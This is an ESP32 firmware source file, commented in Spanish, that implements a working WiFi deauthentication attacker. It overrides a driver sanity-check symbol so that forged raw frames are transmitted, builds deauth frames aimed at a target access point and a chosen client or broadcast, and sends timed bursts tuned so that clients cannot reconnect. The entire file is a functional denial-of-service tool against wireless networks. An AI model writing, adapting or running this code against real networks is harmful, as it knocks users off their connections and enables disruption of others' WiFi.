#include "Deauther.h"
#include <WiFi.h>
#include <string.h>
#include "esp_wifi.h"

// Ritmo del ataque, local a este archivo a proposito (no depende de
// que el header declare nada): cada cuanto sale una rafaga, cuantas
// tramas lleva y cuanto se espacia cada una. 20 tramas cada 40ms
// alcanza para que un cliente normal no llegue a reautenticar entre
// rafaga y rafaga, sin saturar el aire.
//
// Nombres sin el prefijo DEAUTH_ para no chocar si en algun momento
// el header tambien los define como macro.
static const unsigned long INTERVALO_MS = 40;
static const int           RAFAGA       = 20;
static const unsigned long ESPACIO_US   = 500;

// El driver valida las tramas crudas antes de transmitirlas y
// descarta las que no le cierran. Esta funcion es un simbolo debil de
// la libreria de WiFi: redefinirla para que devuelva siempre 0
// desactiva esa validacion y deja pasar la trama tal cual la armamos.
// (Sigue existiendo en la 2.0.17 que trae espressif32 6.9.0, que es
// la que fija el platformio.ini.)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

void Deauther::begin() {
    // Sin inicializacion de radio a proposito (ver el .h):
    // scanner.begin() ya dejo WIFI_MODE_STA y el promiscuo armados, y
    // se llama ANTES que esto en setup().
    atacando = false;
    enviados = 0;
    fallidos = 0;
}

bool Deauther::asegurarPromiscuo() {
    bool encendido = false;
    if (esp_wifi_get_promiscuous(&encendido) != ESP_OK) return false;
    if (!encendido) {
        // Un escaneo activo apaga el promiscuo y lo vuelve a prender
        // cuando termina. Si el ataque arranca justo en el medio, o si
        // algo lo apago por debajo, esto lo rearma.
        if (esp_wifi_set_promiscuous(true) != ESP_OK) return false;
    }
    return true;
}

void Deauther::construirTrama() {
    trama.fc[0] = 0xC0;   // management
    trama.fc[1] = 0x00;   // subtipo 0x0C = deauth
    trama.dur = 0;
    memcpy(trama.src, bssidObjetivo, 6);
    memcpy(trama.bssid, bssidObjetivo, 6);
    trama.seq = 0;

    if (modoBroadcast) {
        // Broadcast va con reason 1 ("sin especificar"). El 7 no sirve
        // aca: significa "trama de clase 3 desde una estacion no
        // asociada" y espera una MAC concreta en addr1.
        memset(trama.dest, 0xFF, 6);
        trama.reason = 1;
    } else {
        memcpy(trama.dest, clienteObjetivo, 6);
        trama.reason = 7;
    }
}

bool Deauther::iniciar(const uint8_t* bssid, int canal, const uint8_t* cliente, bool broadcast) {
    if (!bssid) return false;
    if (canal < 1 || canal > 13) return false;
    if (!broadcast && !cliente) return false;
    // Sin la interfaz STA arrancada no hay WIFI_IF_STA donde inyectar.
    if (WiFi.getMode() == WIFI_MODE_NULL) return false;

    if (atacando) detener();

    memcpy(bssidObjetivo, bssid, 6);
    if (!broadcast) memcpy(clienteObjetivo, cliente, 6);
    canalObjetivo = canal;
    modoBroadcast = broadcast;

    if (!asegurarPromiscuo()) return false;

    // El canal se fija al arrancar. Si el radio se queda en el canal
    // donde lo dejo el ultimo escaneo, el AP objetivo no ve nada.
    if (esp_wifi_set_channel(canalObjetivo, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;

    construirTrama();
    enviados = 0;
    fallidos = 0;
    ultimoEnvio = 0;
    atacando = true;
    return true;
}

void Deauther::detener() {
    atacando = false;
}

void Deauther::update() {
    if (!atacando) return;
    if (millis() - ultimoEnvio < INTERVALO_MS) return;
    ultimoEnvio = millis();

    // Revalidar en cada rafaga: entre una y otra pudo pasar un conteo
    // de clientes o un cambio de canal y dejarnos en otro lado. Sin
    // esto el ataque se queda mudo sin devolver ningun error visible.
    if (!asegurarPromiscuo()) return;

    uint8_t canalActual = 0;
    wifi_second_chan_t segundoCanal;
    if (esp_wifi_get_channel(&canalActual, &segundoCanal) == ESP_OK &&
        canalActual != canalObjetivo) {
        esp_wifi_set_channel(canalObjetivo, WIFI_SECOND_CHAN_NONE);
    }

    for (int i = 0; i < RAFAGA; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_STA, &trama, sizeof(trama), false) == ESP_OK) {
            enviados++;
        } else {
            fallidos++;
        }
        delayMicroseconds(ESPACIO_US);
    }
}
